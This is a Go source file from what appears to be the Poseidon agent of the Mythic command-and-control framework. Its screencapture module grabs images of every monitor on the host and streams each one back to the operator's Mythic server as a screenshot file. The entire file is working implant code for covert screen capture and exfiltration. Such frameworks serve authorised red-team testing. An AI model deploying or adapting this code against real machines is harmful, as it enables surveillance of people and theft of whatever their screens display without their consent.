package screencapture

import (
	// Standard

	// Poseidon

	"strconv"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// ScreenShot - interface for holding screenshot data
type ScreenShot interface {
	Monitor() int
	Data() []byte
}

// Run - function used to obtain screenshots
func Run(task structs.Task) {
	result, err := getscreenshot()
	msg := task.NewResponse()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	finishedTransfer := make(chan int)
	for i := 0; i < len(result); i++ {
		//log.Println("Calling profile.SendFileChunks for screenshot ", i)
		screenShotMsg := structs.SendFileToMythicStruct{}
		screenShotMsg.Task = &task
		screenShotMsg.IsScreenshot = true
		screenShotData := result[i].Data()
		screenShotMsg.Data = &screenShotData
		screenShotMsg.FileName = "Monitor " + strconv.Itoa(result[i].Monitor())
		screenShotMsg.FullPath = ""
		screenShotMsg.FinishedTransfer = finishedTransfer
		task.Job.SendFileToMythic <- screenShotMsg
	}
	filesFinished := 0
	for {
		// just pull the next thing off of the finishedTransfer channel to indicate we finished transferring a file
		<-finishedTransfer
		filesFinished++
		if filesFinished == len(result) {
			break
		}
	}
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return
}
